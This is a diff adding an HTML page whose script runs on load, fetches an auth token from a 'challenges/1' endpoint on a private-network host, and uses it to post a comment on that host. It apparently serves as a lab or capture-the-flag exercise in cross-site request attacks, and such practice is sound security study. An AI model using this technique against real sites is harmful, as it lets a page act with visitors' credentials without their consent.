@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+
+<head>
+    <script>
+        document.addEventListener("DOMContentLoaded", async () => {
+            const url = "http://10.70.4.4/";
+
+            const auth = await fetch(url+"challenges/1" , {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                }
+            })
+            console.log(auth)
+
+            const authToken = auth.headers.get("Authorization");
+
+            await fetch(url+"comments" , {
+                method: "POST",
+                headers: {
+                    "Authorization": authToken,
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    "message": "",
+                    "username": ""
+                })
+            })
+
+
+        })
+    </script>
+
+</head>
+
+<body>
+
+
+</body>
